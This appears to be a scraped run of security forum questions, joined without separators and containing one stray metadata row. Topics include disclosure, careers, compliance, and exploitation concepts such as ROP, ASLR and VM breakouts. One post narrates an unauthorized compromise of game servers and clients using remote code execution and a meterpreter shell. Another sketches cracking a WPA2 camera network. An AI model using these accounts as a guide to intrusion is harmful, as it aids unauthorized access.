Are there specific reasons and cases in which one should choose to disclose in a certain way or in which one shouldn't at all? Personally, I'm torn between the merits of coordinated disclosure and the effectiveness of full disclosure. Coordinated disclosure, I feel, is often viewed as the most ethical option, but it has pitfalls in that it gives companies leverage to do nothing and attack the researcher later. The developers usually don't feel compelled to fix the issue because it has been reported privately, and this inherently opens them up for attack. I guess, then, another question might be whether or not a company which does not patch a vulnerability immediately after being contacted is more at risk than in the case of a vulnerability being fully disclosed on the internet and in which a patch is released quickly. Additionally, companies often do not reward researchers at all, and are just plain nasty in their correspondence. I've heard of many cases of miscommunication, threats, neglect, and [even a case of jail time](URL in regard to the issues that security researchers may notify companies/agencies about. I suppose in the case of a bug bounty program this happens *much* less often and it's generally better for both the company and the researcher. What are your thoughts? "

A regular web site and a web based application you log into to use. I don't really work in security but I have an interest in it and like learning about it where I can. Anyways, we create user accounts on the websites for every day users who buy things on the site. The only people who use the web application are users from an organization who purchase the software and log into the application. On the website, when creating an account for a regular customer, the fields are checked for malicious code. However, if you create a customer record in the web application side, they are not. So i can run a successful XSS attack on the web site, if I enter the information in from the web application side. Since this web application side is supposedly 'secure' in the fact that only authorized users who work for the organization can log into it, do you guys think this should still be addressed? Personally I do cause I dont think you should have that attack vector at all, even if it is supposedly only open to at least somewhat trusted users. However, I tried to talk to another employee here and they said that it wasnt a big deal since you had to log in to enter the malicious code anyways. I have gone ahead and typed up a summary of the vulnerability and taken it to our CEO (its a small company so thats who I go to with these types of things) anyways because I think it should be fixed and is kinda a big deal. Im not entirely sure you cant enter the code in from the regular website anyways if you try to obfuscate what you are putting in and bypass whatever is in place. But I am not experience enough to know how to do that, I just could imagine that its possible. What is everyone's thought, is this something to be concerned about or am I making a big deal out of nothing? "

I've been considering doing a move from development straight into security in some capacity, and I'm not sure exactly how to go about the move. As of right now, I think I'd like to eventually end up in either vulnerability analysis, RE, or pentesting. Ideally, I'd like a position where I could continue utilizing my programming skills a little as well as knowledge of architecture, OS, and the like. But of course, those fields all seem to be ones where it's more difficult to break in (I suppose the former aren't necessary ""net""sec, too). As it stands, I'm not at all opposed to moving into a tangential branch of security before trying to break into one of those sectors. The trouble is that I'm not sure what my chances are without anything really to show. I'm currently planning to read books like Practical Reverse Engineering, Practical Malware Analysis, and learning IDA Pro. I'm already very familiar with gdb and have some experience with Linux kernel level drivers, along with sockets programming and other low-level code. Are there better ways to get my feet wet? Has anyone else made a similar jump? Is it likely that I would need to transition to something like sysadmin/network engineer and receive certs before making a jump into security? Are there companies that would prefer a pure development background and be content doing on-the-job training? Any other general advice would be greatly appreciated. Thanks."

We know that script kiddies are people who merely know how to use point-and-click tools for breaking into systems but they don't know anything besides that, including how those tools work and interact with the system. In today's climate anyone, for lack of a worse word, become a 'hacker' with these point-and-click software.

I'm using a throwaway account because I wanted to explore some netsec concepts for commercial purposes and we all know no one likes commercial purposes. (so I will keep those to myself) That said, I think my query may be valuable to others here. Hopefully. First, I used to be a network/security engineer about 10-15 years ago. I worked for a large antivirus company and helped design and defend the network. I also have a few years background in protocol analysis mostly for network/application performance but also partially for security forensics work. I'm very, very rusty in these areas but I need to do some market research and that's what has brought me to this sub. I'm interested in security tool opportunities within the Vulnerability Management space. I'm trying to understand what the major pain points are for Enterprise organizations utilizing existing toolsets. What is working? What is not working? Ideally, I'd like to get a better handle on the Enterprise Architecture of Vulnerability Management and so a related question is are there Security or Risk Management frameworks that provide a nice neat little graphic so I can figure out where Vulnerability management falls on the security spectrum? Back in the day, I utilized the FCAPS model to run a network...back before ITSM subsumed everything. Wondering if there is a simple model for network security. Anyway, back to VM. As I understand it, in large networks, vulnerability scanners often have trouble scaling when host counts go over 100,000K. This means two things I believe. One is it simply takes a really long time to scan a network in large part because it takes a long time to scan any particular host (duh) but also because the volume of data that results from a scan becomes unworkable quickly. Ever come across this problem set? Any pointers for how organizations work through this? Second, the universe of vulnerabilities is limited but the universe of IT software and hardware. But vulnerability scanners aren't aware of everything ever made. There may be vulnerabilities for software on your network that your scanner has no signature for. But in this case, how would a hacker know to exploit it? Third, even when organizations have ideal vulnerability scanners that can assess their entire fleet of IT deployed, taking action after discovering vulnerabilities is fraught with manual processes that is very time consuming. Many tools attempt to address this: patch management (big fix, microsoft Sccm, etc). When patch management lags, are current security tools (antivirus and host based firewalls/IDS) picking up the slack? A broader question is why do you need AV/IDS if your host is completely free of vulnerabilities? Anyway, I have a few more questions but wondered if any of this resonates with anyone and can help me think through some of this. "

You add in your hosts and it does the analysis for you. So my questions are as follows. 1. I'm assuming programs like these are very ""loud."" Not for those trying to be stealthy. Is this accurate? 2. Is it standard procedure, so to speak, to use tools like this? Or is it more realistic that one would do some in depth scanning, with tools such as nmap, on their own and do their own assessment to see what is exploitable? 3. Of these types of tools available, what are the most widely used programs in the industry and where would be a good resource to begin learning them? 4. Is this how vulnerability assessment of a host is normally done? If not, what is? Thank you for reading and for your time. "

I've [posted before regarding the program](URL and I'm here with another update as I start wrapping up the ""concentration"" classes of my degree. For background, I'm an infosec analyst working for an enterprise who does a little bit of everything, from pentesting, to configuring MPSs, vulnerability management, etc. I'm going to be very blunt and not sugar coat anything. I'm sure NU employees may read this and please take it as constructive criticism as the program can be taken from ""decent"" to ""great"" in a few moves. First off I will only be talking about the Computer Forensics and Vulnerability Management Concentration as well as some of the foundational courses. I won't be talking about the Information Warfare and Security Management Concentration and general education classes. For starters, Norwich is an excellent school *for the money*. Let me make it perfectly clear in saying you will not be fully ready and prepared for what the typical infosec analyst will experience, but it gives a decent foundation, which is usually all that employers are looking for anyways. Just don't have the expectation that since you graduated you should know exactly what to expect. I feel they could certainly update content to reflect on modern day practices. It definitely feels like some of this program was developed 5 years ago, which is a lifetime in IT, especially in some aspects more than others. Norwich's cost per credit is *very* cheap ($375/CrH) and the convenience online is what drew me toward the program (as well as their reputation). Already being in IT for awhile and being in an infosec role, I knew a lot of what they were already teaching and for some classes I could put 2 hours a week into and pass with flying colors, where others were very challenging and required much more time and concentration. Here's the classes I've taken so far and my review of each one. **Fundamentals of Computer Networking** - Self-explanatory and nothing fancy here. It's a decent class with a good instructor. **Programming with High Level Language** - This is C++. This is the language you start out with. It's harsh and difficult for those who haven't programmed before and even for those who have done basic programming in bash or python, this still may come as a challenge (it did for me). While I'm not sure the point of starting out with this language and not teaching Python, Java, or even Ruby, it's only saving grace is the instructor who is one of the best. He will have WebEx meetings with you if you do not understand the material and walk you through the labs if you're having trouble. Aside from that, this class should be replaced with Python or Java in my opinion. Or even, at the very least, C. **Programming with a Low Level Language** - As most people know, ""low level language"" is Assembly. ASM sucks and I hate it. It is a necessary evil, as it's used for exploit research, malware forensics, and in some cases, shellcoding, however 8 weeks for a crash course on ASM using an awful book means that even the same instructor from Programming 1 cannot save this class. It needs either another ASM class with it or a whole new book and format. The class was slightly disorganized as my Visual Studio didn't work with code the same way as the instructors. After watching all the videos for Shellcoding on PentesterAcademy.com, where he gives a crash course on ASM, I learned more in 4 hours from Vivek than I did in 8 weeks at Norwich. That's all that needs to be said about this class. It should also be mentioned there is no shellcoding here or malware analysis. It's just making calculator programs in ASM. **Windows Server Administration** - Very average class. The professor is the ""head"" of the entire program so you'd probably expect something more than ""here's a virtual lab, go do the exercise that walks you through it, then take this quiz"". The book is decent but for a cyber-security program you'd expect the Windows course to have at least 1 week to focus on security. **Linux Administration** - Probably the worst class and professor so far. I wouldn't even consider him a professor, he's just a student aid who grades the written labs against a rubrick. Absent in the discussion forums, frequently was late to post grades, labs were a shit show to say the least (the lab program they use was the worst I've ever used), and overall they omitted things that are vital to security. **Vulnerability Testing I** - Disappointing I guess is the word I'll use. I pushed to take this class before but my adviser said it's really advanced and I wasn't ready. Finally a few semesters later I pushed again and finally was scheduled for it, only to walk into a ""nmap, metasploit, and Nessus course for Dummies"" book (not literally but close enough). The set up is neat; there's no quizzes in this class and the labs/exams are ""break into this box and type up a report"". The disappointment is in the lack of challenge. Anyone can run Nessus, read it's vulnerability output, then exploit it with a Metasploit module. Since this was the first class though I assumed it was supposed to be really easy as an intro and get harder. **Vulnerability Testing II** -- Extremely disappointing is the phrase I'll use here. I expected this class to be much more difficult, as ASM was to C++, but this was just a continuation of ""run nmap, run Nessus, use metasploit"". As some of you well know, as do I, pentesting is *so much more* and I was really hoping to learn something here, but for the midterm it was literally just Metasploitable 2 and DVWA. One week was spent on Web Pentesting with Mutillidae and the effort put into the VMs is so low; they're just recylced and reused so the exploit you used in your week 1 lab is the same exploit you'll use in your final. I literally exploited MS03 DCOM at least 8 separate times. The final exam is just to to break into a few boxes with one of them using Mutillidae and DVWA. At least make it challenging! I was expecting the difficulty to be on par with ""easy"" VMs on Vulnhub, but instead I literally got Metasploitable 2 and DVWA. My other complaint about this class is the version of Kali is so old and some of the tools outdated, that for the ""Payload creation"" week you're using *msfpayload and msfencode*. For those unaware, those were both [replaced over a year and a half ago](URL by msfvenom. This is what I'm talking about when I say this program was clearly designed several years ago and fails to update. You will never use custom scripts in this class, you will never use any scripts from sploitsearch, you will never get into modifying previous scripts or creating your own, you don't go into shellcoding, privilege escalation &amp; cronjob jacking, brute forcing, etc. Basically you hardly go over anything besides Nmap, Nessus, and Metasploit. The hardest part of this class is typing up the reports which have unclear guidelines as far as the direction of the report (as in: am I reporting this to the instructor, a client, or someone else) and are graded as such that if you try to be clever at all, you'll be dinged for not doing it ""his way"". Overall I'm in no rush to get this degree, as to me it's just a piece of paper at this point and purely for merit. I'm reimbursed from my work so I figured why not. My next classes are Malware analysis which is the same instructor from Programming 1 &amp; 2 and network forensics, which I feel will just be a glorified PCAP analysis/Wireshark-for-dummies course. I think that there should be an entire class for Web App testing, instead of 1 week with Multillidae, as Web App is such a huge part of pentesting in general. **The question people are probably wondering is**: *So is it worth it?* and my answer would be yes if you're just looking for a cheap degree. Will you learn things you don't know? Absolutely. I definitely did. Was what I learned worth the tens of thousands of dollars in debt? Nah, not with experience already in IT and security. As I said before, I think there's a lot of vital information they could've used to update their classes to make it more relevant for the world today and I feel like as a cyber-security program, every class should have some talk about security in it, where most did not. But if anyone has any questions, fire away!"

I worked in the public sector for about seven years. The only person Sec+ certified besides myself was the DIT, so most things security related kind of fell my way. I pushed for all sorts of things like dropping our number of domain admins from 16 active employees to 3 active employees. Got all of our computers boot processes changed, because when I started the BIOS was unlocked and you could boot from any device. Redesigning our user data on our file servers because the security was beyond buggered and the configuration less than consistent. Then I did more in depth things like actively scanning our network for vulnerabilities (found a fax machine in our HR dept that was vulnerable to heart bleed), finding errors in vendor mandated configurations of our information management system that lead to serious vulnerabilities, as well as finding a massive flaw in our financial software that could let any employee view any other employee's paystub, including bank account number in plain text.

My inclination is to compress it and drop it into Backblaze B2 for a few years and forget about it, since we already use them to backup endpoints. But B2 isn't encrypted. Right now, I'm considering putting the folders I want into encrypted .7z files with long passwords stored in a Keepass file. The files need to be compressed anyway, so unless there's a vulnerability or inherent weakness in 7zip's encryption, this seems the obvious choice to a layman such as myself. Backblaze offers [an alternative way](URL to encrypt files with OpenSSL that in essence seems to be similar to my above method. I don't know enough about OpenSSL vs. 7zip encryption to distinguish them on security grounds, but the 7zip method seems less complex, and something someone who isn't super technical could do. I know there are also a number of other options out there as well, and I'm open to any of those. I'm not a security professional, so let me know if my idea seem moronic. I've considered putting the files onto an external HDD instead, but I'd still need to encrypt it, and I feel like it could get lost more easily.

How much experience do you have in computer science / networking / vulnerability testing / etc.? 3. Could you briefly walk us through your process of network testing and, after the test is complete, vulnerability reporting? 4. Do you ever write your own hacking tools? In your audit, do you primarily use these homebrew utilities or commercial ones such as nmap and metasploit? 5. Have you taken any officially-recognised ethical hacking qualifications such as CEH, CISSP, etc.? 6. Are so-called soft skills (e.g. ability to communicate effectively, eloquence of speech, ability to deal with difficult employers) just as important as so-called hard skills (e.g. competence in computer science and digital security)? 7. Would a tool to crack password-protected zip files be of any importance to the penetration testing process? If not, can you think of any area of digital security in which it would be useful? If so, what would you want to see as inputs and outputs  what sort of arguments would be required, and would you want switches to increase or decrease verbosity, change the type of attack (brute force, dictionary attack, etc.), or to create a log of the processing? 8. Have you ever used the program hashcat? If so, can you identify any problems with that piece of software? Complexity, efficiency, prerequisites, etc.? 9. Was / is your freelance work enjoyable? 10. Finally, do you plan on continuing work as a penetration tester or will you seek a more stable source of income? **Edit: If anyone's curious about how I'll be coding the script, I've already got a sort-of working prototype for a brute forcer and a dictionary attack on my github - click [here](URL if you want to take a look.

To give some background, I started to read up on x86 assembly and reverse engineering four years ago because I was interesting in game-hacking. I only had basic Lua scripting knowledge at the time, so I found assembly to be very difficult and it ended up taking a very long time for me to understand the concepts that I was reading about. Eventually after I had a basic understanding of x86 and RE I was able to acquire C with relative ease from various online resources. About two years ago I became interested in software vulnerabilities and more specifically, remote code execution. I began to read up on buffer overflow techniques, heap overflows, ROP, etc. The only formal education I have in programming is from two courses that I took last year on VB.NET and C#. Two years ago I wrote and sold a program I had (rather poorly) written in C++ that used code injection to give an advantage over other players in an MMO. It was the first time I was able to make any kind of profit from my limited reverse engineering and programming skills. I had been playing the MMO since I was 9 and I had always been fascinated by the ""hackers"" that had extra control over the game's mechanics, so finally being able to write my own hack was an exciting thing for me. After writing the program I ended up abusing it very often in-game, and I would often get suggestions from players to report my findings to the developers for an in-game reward. I made several attempts to report my methods to the developers, however they ended up either ignoring me or not owning up to their promised reward after the patch went out. After my attempts to report issues failed, I promised myself to never report anything to the developer of the MMO again. I definitely considered myself to be a blackhat before this year. When the program that I was selling eventually got patched a little over a year ago, I decided to start looking for exploitable vulnerabilities. After a few months of searching, I read about a bug that some users had found in a new feature that had been released. I investigated the crash dumps associated with the bug in Windbg and ended up figuring out how to get remote code execution on any client connected to the server I was in. I crafted a payload that allowed me to remotely make calls to ShellExecute on any windows machine in my server. After I rickrolled everyone that I knew, word spread quickly of my exploit to the developers. They ended up patching the issue within two days of my discovery. I attempted to report the exploit to the developers a few hours before it got patched, so I was promised a reward. They, once again, did not deliver on their promise for an in-game reward (which isn't even worth any actual money). My takeaway from the experience was to not tell my friends about any future shellcode exploit, and I reminded myself to never report anything to the developers. Fast-forward a week later, I was once again searching for a new RCE vulnerability. I figured after the first one that it would take me many months, if not years, to get my hands on another one. I ended up finding another vulnerability within a month of the first. All of the servers were vulnerable, as well as any client connected to a server. After developing an exploit, I downloaded the metasploit framework for the first time and executed a reverse meterpreter shell on a server. I had access to all of the server files and downloaded memory dumps of the running server processes. After looking over the data obtained from the server dumps, I had the ability to completely destroy the MMO's economy and I had complete control over many different features. I had the ability to clear everyone's friend lists, award in-game achievements, steal user accounts, etc. For a while I continued to stay quiet but eventually I got very bored. I was eager to use the new powers that I had gained, so I began to troll some of my friends. After a month, I gained the attention of the developers after a few high-profile incidents with modifying the profiles of certain users. I was contacted by a company representative who offered 2.5K for the full details on the exploit, to which I declined. A few minutes later, a developer threatened to take legal action. The whole situation was getting a bit out of hand and school was about to start, so I decided to take a break from the game to focus on my coursework. I returned in October to find that the vulnerability had been patched and that I had a new message in my inbox from the software engineer who is in charge of security and vulnerability reports. I read the message and, to my surprise, they expressed that they wished to contract me as a security consultant. I was a bit skeptical at first, but I realized that if they had really wanted to get me into trouble they could have easily obtained my personal information from somewhere else, like from my saved billing information. Once I began filling out the paperwork to form an LLC in December, things really started to sink in. I realized that this was my chance to easily make the switch from blackhat to whitehat and to turn my hobby into a profession. I was more than happy to make the change. I signed the contract in February and haven't looked back since-- they even gave me a bonus for my previous reports! So Netsec... what is my next move? I don't have any certifications and I have little to no experience with UNIX/Linux besides occasionally using Kali. I also lack knowledge and experience with web development and web server configuration. My first experience with any kind of VPS was setting up a DigitalOcean droplet for Apache/Dovecot/Postfix in January. I'm trying to beef up my resume because I don't think that my weighted 4.1 GPA is particularly impressive and the colleges that I have been looking at are pretty competitive. I'd also love to be able to get another contract, but I have no connections to anybody within the industry. Any suggestions are much appreciated!"

There are a number of CMDB and software asset management systems that potentially fit some of my needs, however not sure if they can do exactly what I am looking for. I do have a budget for this but it isn't super large. Any suggestions would be appreciated."

I've talked to QA about getting their cycle shortened but they're adamant that all of the tests are required. TLDR: If I find a vulnerability that affects all of our supported devices, it would take over a year in QA time before we could get all the firmware patches out.

We have a decent start with tools: SIEM, well-known commercial vuln scanning and tracking platform, and some other stuff. Without sharing my location or exactly what we do, we do accept credit cards, and we do store credit card data on premises for use in recurring transactions (non-tokenized transactions, I know :( ). I'm very aware that the last bit puts us into SAQ-D territory, meaning we must address all 200ish of the PCI reqs. I feel frustrated at the complacency and inertia from the workers in my dept. My role, as described, is to recommend/advise, and to insure that we're compliant or moving to compliance. We're not doing that. Other than implementing the tools I use daily to detect security incidents, we don't make changes, pretty much ever. Suggested changes I include in reports are simply ignored. To be clear, we're not talking about bleeding edge stuff here, these are full on basic changes, stuff that should already have been happening. Some examples: * Most of our users use virtualized desktops (great, right?). However, we *never* update the ""golden image"" for those desktops, ever. We have known vectors of compromise installed to that image, in versions that are 6+ years old. Ugh. Yes, we've been hit by various flavors of bad stuff because of that. * Our cardholder data environment runs on EOL operating systems. There is currently no plan to address this, other than a ""yeah, we need to do that."" * Our vulnerability management is non-existent. While I have the data and documentation of the vulns, we do nothing about them. I have reams of data that I've tried to present various ways, and our admin group keeps throwing out objections about legacy apps used by a small sub-group of the company. Okay, if that application is necessary and won't run on a patched platform, how about segmenting it off from the network, or using some other mitigation strategy so that we can keep the rest of the network compliant? Doing nothing because of one app that 10 people use on a network of 700+ users is not defensible. * Certain pieces of our security stack (firewalls, web filter, corporate anti-malware) have some fundamental problems. I don't want to fully specify those, as they could ID me. As an organization, we do nothing about those. * Our admin/help desk group simply doesn't investigate security incidents I assign to them in a timely fashion, or sometimes at all. Even when the incident is big, primary incident response has been 100% me, unless it's a ""scramble all fighters"" level incident. We just had one of those, and I'm sure that another one is not too far off. We have 700+ users. I am swamped with just day-to-day investigations, to say nothing of driving real organizational change to improve our security posture. * In one case, one piece of security based software just hasn't been working. The guy who was tasked with running and monitoring that piece has done nothing about it. He had given me database access (read and write) to its back-end for some reporting stuff. After 2 years of him not doing anything, I simply ""hacked"" access to the admin functions of the platform by giving myself access directly in the app's DB tables, and not through the app's UI. I told my boss before I did it, and then informed the actual admin after it was done. I have my boss's blessing in having done this. I've started making the changes needed, and this set of problems is decreasing in number. However, I can't possibly do everything that's required organization-wide. I'm very aware that what I just described would be a liability for me in most properly functioning organizations. * My direct boss is on-board, however we don't have the buy-in and director level sponsorship that we need to really start making headway on the list above (and many other issues I have purposefully left out). I feel as if the admin group and others who have been around the organization longer than I feel as if they can simply ignore my recommendations, and that I'll go away. I know the easy answer: quit. Without going into all the details, that's not an option, at least for a while. I am geographically tied to where I am. I also have family obligations that prevent me from travelling. This particular gig means I never have to travel. I have a current opportunity in another area of the country, but I simply can't take it, for reasons. This sounds like a bad situation, and it is, but it's one in which I have to stay for at least 5 more years, and likely more. The other potential answer would be to go full-on whistle-blower mode. However, my personal situation is such that I simply can't do that. There are definitely ways I could drive change this way, however I would make enemies of people who have been in my org for 15+ years. I have no illusions about who would ""win"" in an organizational politics fight. This is really not an option. Seriously, what do? How do I continue to work here without driving myself nuts? Sorry for the novel. TL;DR I am the PCI DSS patsy for my organization. I have a nice title, however we don't do shit to make things better. What do?"

The line of questioning will be revolving around how I think cybersecurity and the other IT dominions within the company need to work with each other, and how budgeting should be basically allocated. As far as working with the other IT departments(the windows engineers for the end users,the linux engineers for the servers, the developers for the web apps, etc) to me it seems obvious that communication is key. Being able to talk their language when it comes to allowing our team to instill a security culture, have them given the proper trainings, etc.(web apps have vulnerabilities as developers make assumptions about how users interact with the application, the windows engineers may not be patching frequently enough, weak domain credentials, end users could cause devastating consequences for the company if they aren't savy with phishing attacks, linux admins may be running services that are vulnerable or running services that aren't in use and therefore should just be disabled for the sake of it etc) Security is a layered defense in depth approach. starting from the wan and acls, to the firewall and ids/ips, to the AV/content filtering at a network level, down to least privileged models and end user AV and everyone needs to be on board and on the same level. I have ideas about risk models, where one measures the impact, threat, and vulnerability and weighs out how to ration the budget by analyzing the total risk based on the weights of those 3 factors. Especially implementing data classification and labeling, and allocating based on the classification system of sensitivity.(this is a financial company) I am not sure I am on the right track. It seems kind of vague I know, so I was kind of hoping for some guidance. Please be easy on me and don't spoon feed me. Just pointing me in the right direction on some resources I can dive into would even help.

I currently work as a security consultant doing vulnerability remediation and security operations. My preferred option is **SEC576(GPEN)** as I've heard great things about the instructor Ed Skoudis, and I feel like it would be a good step towards my goal of getting OSCP by the end of the year. However, they want us to prioritize Incident Response courses, and they've pointed me to look at the following: * **FOR572** (Advanced Network Forensics and Analysis) * **FOR508** (Advanced Digital Forensics and Incident Response) * **SEC504** (Hacker Tools, Techniques, Exploits and Incident Handling) I don't want to take 504 because looking at the criteria it seems very basic/high level and I feel like this is a certification I can self study. Though I find the offensive side of security intriguing and fascinating, and I love doing it, what I hope to do is build strong knowledge on both sides (offensive and defensive) in order to be a strong security architect and/or security engineer one day.

When it's from Asia i see alot of default credential attempts from the same ip before giving up. I assume this sort of attempt is an automated system. However, when it comes from the states it's usualy fewer attempts and sometimes the credentials being used are less ""default"". The log even show the help command being issued which returns supported commands. I assume this can be used to try to determine a version or something looking for a vulnerability. I have logged one stateside address in particular attempting this across multiple days. It appears to be a cloud hosting service no less. I'm stretching my knowledge a bit here but i suppose an attacker could be using this service as a proxy for attack. I could easily block this ip in my ios router firewall and be done with it. Or change my listening port from 21 to something less common. I'm curious, what softwares or techniques are most likely being used to scan ip's and then attempt a login. Is there a software i could use to gather more information when an attempt is being made from a certain ip? EDIT: Did a little more research. Another ip i've logged is from a hosting service called server4you.de (germany). It seems this service is notorious for hackers using it as an attack vector. I found many forums describing successful ftp and other attacks originating from server4you. Not to mention many reviews describing their boarderline scammy service cancellation policy.

Would like to check if mitigating by disallowing stack execution can mitigate this risk. Also one thing I don't understand The code that causes the vulnerability was introduced in May 2008 as part of glibc 2.9. The code that causes the vulnerability is only present in glibc's copy of libresolv which has enhancements to carry out parallel A and AAAA queries. Therefore only programs using glibc's copy of the code have this problem. I have glibc 2.19. Does it mean I am not affected? thanks"

Here are some helpful tips if you're applying to SOCs: Ask employees who ACTUALLY WORK IN THE SOC what their day to day tasks look like. Do not let them dodge the question by saying something like, ""well it varies, so..."". Don't allow them to do that. If it's a bad SOC as in the analysts only look at syslog for 12 hours straight then they're going to avoid giving you an honest and direct answer. Ask them what kinds of tools they use. They should be using a SIEM (security information event manager) which collects syslog, packet capture, and other logs (Active Directory, etc). Ask them if they use full packet capture. Ask if any of the analysts perform digital forensics. Do they use IDA Pro? EnCase? REMnux? Vulnerability scanning? Wireshark? Paraben? Do they have access to employee emails (malicious email analysis)? What about SSL decryption? Can they see malware beaconing out over 443??? What service providers do they work with (AT&amp;T, IBM, etc)? Ask if they have any kind of promotion or tier structure. Ask them if they are a 24/7/365 shop. Ask about what kind of shifts you could expect if they are a 24/7/365 shop. Ask about security training. Do they sponsor anyone to go to conferences and skills training like SANS? Find out if they are an MSP. About how many clients do they support? Find out what kind of data they're looking at. If they only look at one type of data like IPS or firewall logs then it's a bad shop. Run away. SOCs should be utilizing every type of log available like full packet capture/netflow, firewall logs, proxy logs, Active Directory logs, DNS LOGS (!!!), and more. More importantly, HOW DO THEY ESCALATE POTENTIALLY MALICIOUS TRAFFIC? You don't want to be a ticket jockey, you want to actually be investigating suspicious events. You're an investigator and the logs are the clues. You need as many clues as you can get. Do analysts simply send an email to a supervisor when they get a suspicious IPS log or do analysts correlate that data with other logs and information? Is there someone there who is more experienced that you can go to with questions? Do they mentor their younger/less experienced analysts? Hope this helps!"

From what I understand, the malicious function overwrites information in the buffer with whatever shellcode it wants to execute, then overwrites the process' instruction pointer (that's the EIP, right?) with the memory address of the beginning of the shellcode entered into the data segment of the program's memory. Is this correct? Also, how do ROP/ret2libc attacks differ from this method? I know that DEP prevents code from being executed in the data segment of the program, and that ROP gets around this restriction by executing code that's already present in the loaded application. How is this done? What about data-only attacks? I read something about them in a grsec/PaX powerpoint, and it seems like they're similar to arbitrary read/write exploits. Is this true? How specifically do data-only attacks lead to shellcode execution? Also, when a process is compromised, how does the attacker prevent the compromised process from crashing/exhibiting issues? As far as I can understand, it would seem like hijacking the process' execution would cause the actual process (say, for example, a web browser) to stop executing (since it is now being used to execute shellcode instead of the actual program). It would seem like this would be relatively noticeable. And is it required for shellcode injection attacks to spawn a new thread or process to continue execution? In other words, is it generally required for a piece of malware that's started through some kind of shellcode injection to start a new process than can be detected in the Task Manager in Windows or ps -aux in Linux, or could the shellcode be executing in the same exact context as the process it has compromised?"
580,vulnerability,AskNetsec,ASLR and VM Breakouts?,1,3wm1qp,https://www.reddit.com/r/AskNetsec/comments/3wm1qp/aslr_and_vm_breakouts/,2015-12-13 16:10:07,"Would ASLR applied to the host operating system make it more difficult to break out of a VM? As I understand it, VM breakouts like Venom work by causing a buffer overflow in the code (running on the host) that is responsible for emulating some hardware device (in the case of Venom, a virtual floppy drive). But the buffer overflow has to point the code running the emulated device to some place in memory to start executing malicious code, right? And because the code being targeted is running on the host, it can't be pointed to what the VM thinks is its physical memory, since that is only virtual memory assigned to some unknown physical memory location on the host (for example, even if the compromised VM has some malicious code waiting to be run at 0x8FFF0000 in its memory, it can't tell the emulator code to start executing there, because 0x8FFF0000 in the VM corresponds to some other location on the host), right? So it would have to point the emulator program to some location in the host's memory. If the VM has some kind of arbitrary write access to the host, or if the host doesn't have ASLR enabled, then this would be straightforward -- just point the compromised emulator program to the area you have arbitrary write access to or the known location of the statically loaded program (assuming some kind of ROP exploit). But if the VM doesn't have arbitrary write access, and ASLR is in effect on the host, wouldn't the malicious code in the VM have no way of knowing what value to overwrite the return address in the emulator with? Since it has no way of knowing where its memory is located on the host, and since the host's libraries/binaries are all located in random locations, wouldn't there be no way to accurately hijack the emulated device's control flow, and thus no way to compromise the device unless you had some infoleak vulnerability on the host OS? Also, would protections like stack canaries prevent buffer overflows in code being attacked as part of a VM breakout (by killing the VM program when the virtual floppy device had its buffer overrun by Venom, for example)? What about kernel patches like kGuard or grsec/PaX?"

Absent more details regarding the criticality of the systems -- I have internal policies that right now require that ""high"" vulnerabilities be resolved within 30 days... and medium within 60 days (or be scheduled and recorded on an internal risk register). I also have a monthly management report on the 5th of every month. One theory is to run a scan on the 1st or 2nd of the month - we give me time to digest and forward the information before the management report. It also gives me nearly the full 30 days to remediate the vulnerability before the next scan (and the documentation shows up). That said - the vulnerability could sit there for 30 days before it shows on a scan. Alternatively, I could go with something like the following: 1 - run a diagnostic scan on the 15th of the month - this gives me a shot to resolve issues before month end 2 - run a ""scan of record"" at month end (or on 1st of the month) - that I use to report on. This might require a policy change (to ignore the diagnostic scan starting the 30 day window) -- but would seem to be more secure.. Thoughts? "

I'm not in the security auditing field myself but as a security enthusiast when I try to explain to fellow developers vulnerabilities like reflected XSSs, CSRFs and timing attacks, they systematically dismiss them as highly unlikely or unimportant. I also have never seen a proof of concept for timing attacks on webservers (my background) which although I understand the theory of how the attack works doesn't really help when trying to convince someone that it should be taken seriously.

Now its already been graded (didn't do so well). Now I'm curious to see what exactly we were doing. Basically we had to do a lab exercise by ourselves, then write a paper on it. Sadly, the professor didn't really talk about what the lab exercise was doing. So what we did was start up a server in a LAMP architecture. Once we had it up and running (had a fake website and all) we went to the fake website that we were hosting on our own computers and ""hacked"" it. What we did was issue it bash/shell commands (like ls thisdir) inside this little search/index box and it would display information that normal users wouldn't be able to see. Pretty much no one in the class did well on the paper because most didn't know what we did. So what exactly is that? All we know is the professor referred to it as a ""server vulnerability"" and ""scripting vulnerability"". However, when we google those terms we don't see anything that refers to it as that. We commonly see XSS, cross site scripting. Is what we did considered XSS? If not, what kind of attack/vulnerability is this? Thank you so much for those who answer. I have a feeling my group isn't going to want to rewrite it, so I'm going to have to rewrite the whole thing to fix it. So any help figuring out what this is exactly would help me greatly haha. "

As I'm a simple iOS programmer with zero network background, it is way above my head and ask for your help (it fell to me since I am the only engineer in ~15 people small company). The system is WPA2-PSK and MAC filtered, but as far as I know there is no additional measures. The cameras are for the exterior and entry points of a professional sports stadium, and the system consists of a Network Video Recorder, ethernet cables to a antenna/gateway, which connect wirelessly daisy-chain to multiple cameras. From what I've googled, it seems the system is easily cracked with a hacking tool? Take WPA2-PSK credentials from sniffing the constant packets being transmitted, then sniff out MAC address and spoof MAC to an allowed MAC. Am I correct? I believe that leaves putting together packets into coherent data for getting control signals and camera feed, which could be easier than would be normal since I heard that the products conform to some kind of camera feed network protocol. Would appreciate any help on the following: * Would appreciate any input on whether my conclusion above is correct, and explain/expand/modify. * Does the settings section have any security measures that I have missed? My current assumption is that they are all part of WPA2-PSK or other non-security related data. * How difficult would it be to hack the current settings? * If the system is compromised, would it pose any threat to internal network and other computers that it is connected to? What would be under risk? * Are there any more secure protocols that could be easily implemented and is publicly available? We have a close relationship with the Camera manufacturer and might be able to urge them to upgrade their security protocols. *Settings*: The spec sheet of the product lists the following for the *Security/Qoz* section: * 802.1xAuthenticator (EAP-TLS, EAP-TTLS, PEAP) * MAC Based wireless connection, 64/128bit WEP, 802.11i * 802.11eWMM / Qos, Cos / maximum 8 virtual SSID * 802.1q VLAN / Wireless VLAN for each SSID / MAC Filtering I've peeked at the settings when they were demoing the camera and I've seen the setting WPA2-PSK selected.

